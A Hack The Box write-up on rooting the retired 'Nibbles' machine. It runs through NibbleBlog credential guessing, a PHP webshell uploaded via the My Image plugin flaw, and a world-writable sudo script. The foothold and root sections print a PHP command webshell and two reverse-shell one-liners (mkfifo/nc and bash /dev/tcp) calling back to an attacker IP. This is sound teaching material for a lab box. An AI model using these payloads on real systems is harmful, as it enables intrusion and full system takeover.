---
layout: post
title: "HTB: Nibbles"
subtitle: "default NibbleBlog creds to a plugin file upload shell, then a writable sudo script to root"
date: 2023-02-02
tags: [htb, linux, file-upload, sudo, privilege-escalation]
category: writeups
kind: machine
tldr: "A hidden /nibbleblog directory runs NibbleBlog 4.0.3 with admin:nibbles. The My Image plugin lets me upload a PHP file with no checks for a reverse shell as nibbler. sudo -l shows a writable, root-run monitor.sh, so I append a shell and run it for root."
---

## the box

Nibbles is an old retired Linux box, one of the early easy machines. It is a tidy chain: find the real app behind a misleading comment, guess a CMS password that matches the box name, abuse a plugin that does not check upload extensions, then ride a world-writable script that root runs through sudo. Nothing here needs an exploit framework.

Two ports, both old:

```
22/tcp open  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
```

## recon

Full nmap with service and script scanning:

```bash
nmap -sC -sV -oA nmap/nibbles 10.129.165.135
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH 7.2p2 has no useful public CVE worth chasing, so the web on `80` is the way in.

The homepage is almost empty, just `Hello world` printed to the page. The interesting part is in the HTML source:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

A comment that says "nothing interesting" is exactly where to look. Directory busting the root path returned nothing, so I pointed the buster at `/nibbleblog/` instead:

```bash
dirsearch -u http://10.129.165.135/nibbleblog/
```

```
301  327B  /nibbleblog/admin           ->  /nibbleblog/admin/
200  606B  /nibbleblog/admin.php
200  522B  /nibbleblog/admin/
301  338B  /nibbleblog/admin/js/tinymce
301  329B  /nibbleblog/content         ->  /nibbleblog/content/
200  724B  /nibbleblog/COPYRIGHT.txt
200   92B  /nibbleblog/install.php
301  331B  /nibbleblog/languages
301  329B  /nibbleblog/plugins
200    5KB /nibbleblog/README
301  328B  /nibbleblog/themes
200  815B  /nibbleblog/update.php
```

The `README` names the software:

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

About the author
Name: Diego Najar
```

NibbleBlog 4.0.3, codename Coffee. The default install leaves the private config readable, so I pulled the two XML files that matter and formatted them with `xmllint`:

```bash
curl -s http://10.129.165.135/nibbleblog/content/private/config.xml | xmllint --format -
curl -s http://10.129.165.135/nibbleblog/content/private/users.xml  | xmllint --format -
```

`users.xml` confirmed the admin username and showed the failed-login bookkeeping:

```xml
<users>
  <user username="admin">
    <id>0</id>
    ...
  </user>
  <blacklist type="ip" value="...">
    <date>...</date>
    <fail_count>...</fail_count>
  </blacklist>
</users>
```

That blacklist block is the warning. NibbleBlog records failed logins per source IP in `users.xml`, and after enough failures it locks that IP out. So blind brute forcing is a trap on this box, it bans you before it finds anything. The config XML mentions `nibbles` repeatedly (site name, mail addresses pointing at the box), and the box itself is named Nibbles, so the obvious guess is the credentials match the box name. `admin:nibbles` logged straight into the admin panel on the first try, which is the only safe way to do it given the lockout.

## foothold

NibbleBlog 4.0.3 has a known authenticated arbitrary file upload, CVE-2015-6967, in the My Image plugin. The plugin saves whatever you upload without checking the extension, so a PHP file uploads and executes. The plugin config page is here:

```
http://10.129.165.135/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
```

I made a minimal webshell first to confirm execution before going for a full shell:

```php
<?php system($_REQUEST['cmd']); ?>
```

The plugin always writes the upload to a fixed name and path regardless of what I called the file, so the shell lands at a predictable location:

```
http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php
```

Testing command execution:

```bash
curl 'http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php?cmd=id'
```

```
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

That is RCE as `nibbler`. To upgrade from the webshell to an interactive shell I used a mkfifo reverse shell. I started a listener:

```bash
nc -lnvp 4444
```

Then fired it through the webshell (URL-encoded):

```bash
curl 'http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php' \
  --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.32 4444 >/tmp/f'
```

The listener caught a shell as `nibbler`. After a quick TTY upgrade (`python3 -c 'import pty;pty.spawn("/bin/bash")'`), the user flag is in the home directory.

## user

The shell runs as `nibbler` (uid 1001). The user flag sits in `/home/nibbler/user.txt`. The home directory also holds the seed for the privesc:

```bash
nibbler@Nibbles:~$ ls
personal  personal.zip  user.txt
```

`personal.zip` unzips to `personal/stuff/monitor.sh`. On a clean boot the extracted tree may not be present yet, in which case unzipping it is what creates the `stuff/monitor.sh` path:

```bash
unzip personal.zip
```

## root

`sudo -l` as nibbler:

```
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

nibbler can run `monitor.sh` as root with no password. The catch that makes this trivial is where the script lives and what its permissions are. It sits inside nibbler's own home, and it is world-writable:

```bash
ls -la /home/nibbler/personal/stuff/monitor.sh
```

```
-rwxrwxrwx 1 nibbler nibbler 80 Jun 24 07:27 monitor.sh
```

So I control the contents of a script root will execute. I appended a reverse shell rather than overwriting the file, so I do not clobber whatever the script was meant to do and break some other behaviour I might still need:

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.16.32/4444 <&1'" >> /home/nibbler/personal/stuff/monitor.sh
```

With a fresh listener up, I ran it through sudo:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

The original script body runs, then the appended line fires my shell back as root, and the listener catches a uid 0 session. The root flag is in `/root/root.txt`.

## takeaway

Nothing exotic, just a stack of small misconfigurations that each point at the next. A "nothing interesting" comment marks the real app. A CMS password equal to the box name lets you in on the first attempt, which also dodges the per-IP login lockout that would punish brute forcing. An upload plugin trusts the file you hand it. And a root-run sudo script lives in a user-writable path. The one careful move worth keeping is appending to the sudo script instead of overwriting it. Preserve what the file already does, just add your line at the end.
